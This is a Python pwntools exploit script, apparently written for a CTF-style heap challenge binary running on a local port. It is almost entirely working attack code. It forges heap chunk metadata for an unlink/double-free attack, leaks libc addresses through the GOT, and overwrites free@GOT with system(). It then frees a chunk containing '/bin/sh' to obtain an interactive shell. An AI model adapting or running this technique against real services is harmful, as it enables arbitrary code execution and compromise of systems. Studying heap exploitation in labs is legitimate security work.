#! /usr/bin/python
#coding:utf-8
'''Heap_DoubleFree - Ret2libc (ALSR - on)'''

import sys
sys.path.append("..")
from pwn import *

class exploit(object):
    'exploit6'
    def __init__(self):
        self.options={'dIP': '127.0.0.1', 'dPort': 11112}
        self.property = {
            'libc_free':0x0,
            'libc_sys':0x0,
            '&p0':0x0,
            'got':0x0    #in fact gets@got
            }
    def test(self):
        # find libc
        libc = ELF('/lib32/libc-2.23.so')
        self.property['libc_sys'] = libc.symbols['system']
        self.property['libc_free'] = libc.symbols['free']
        # find &p0 and got
        libc = ELF('./heap')
        self.property['got'] = libc.got['gets']      #in fact gets@got
        self.property['&p0'] = libc.symbols['a'] + 4*2000
        print self.property

        # begin exploit
        ip, port = self.options['dIP'], int(self.options['dPort'])
        p = remote(ip, port)
        _ = raw_input("Press Any Key to Begin.")

        def new_chunk(size,content):
            while p.can_recv() : p.recvline()
            p.sendline('m')
            p.recvline() # malloc
            p.recvline() # size
            p.sendline(str(size))
            p.recvline() # content
            p.sendline(content)
            p.recvuntil('!\n') # ok

        def free_chunk(no):
            while p.can_recv() : p.recvline()
            p.sendline('f')
            p.recvline() # free
            p.sendline(str(no))
            p.recvuntil('!\n') # ok

        def edit_chunk(no,content):
            while p.can_recv() : p.recvline()
            p.sendline('e')
            p.recvline() # edit
            p.sendline(str(no))
            p.sendline(content)
            p.recvline('!\n') # ok

        def print_chunk(no):
            while p.can_recv() : p.recvline()
            p.sendline('p')
            p.recvline() # print
            p.sendline(str(no))
            return p.recvuntil('end')

        new_chunk(504,'A'*504)
        new_chunk(512,'B'*512)

        free_chunk(0)
        free_chunk(1)

        #关键payload
        content = p32(0x0)  + p32(0x1f9) + p32(self.property['&p0'] - 0xc) + p32(self.property['&p0'] - 0x8) + 'a' * (0x200 - 24) + p32(0x1f8) + p32(0x108)
        new_chunk(768, content)

        new_chunk(20,'/bin/sh')

        free_chunk(1)

        content = 'a'*12 + p32(self.property['got'])
        edit_chunk(0,content)


        # leak GOT
        print 'leak GOT...'
        rec = print_chunk(0)

        ans=[]
        #for i in rec: print hex(ord(i)),
        for i in range(0,8):
            ans.append(rec[i*4:i*4+4])
        gets = u32(ans[0])
        free_addr = u32(ans[1])
        getchar = u32(ans[2])
        malloc = u32(ans[3])
        puts = u32(ans[4])
        gmon_start__  = u32(ans[5])
        libc_start_main = u32(ans[6])
        isoc99_scanf = u32(ans[7])

        sys_addr = free_addr - self.property['libc_free'] + self.property['libc_sys']

        print '\t\tfree_addr = ' + hex(free_addr)
        print '\t\tsystem_addr = ' + hex(sys_addr)

        # overwrite GOT
        print 'overwrite GOT...'
        content = p32(gets) + p32(sys_addr) + p32(getchar) + p32(malloc) + p32(puts) + p32(gmon_start__) + p32(libc_start_main) + p32(isoc99_scanf)
        edit_chunk(0,content)


        while p.can_recv() : p.recvline()
        p.sendline('f')
        p.recvline() # free
        p.sendline('3')

        print "\tfree(a[2003]) ===> system('/bin/sh')"
        p.interactive()





if __name__=='__main__':
    exp=exploit()
    exp.test()



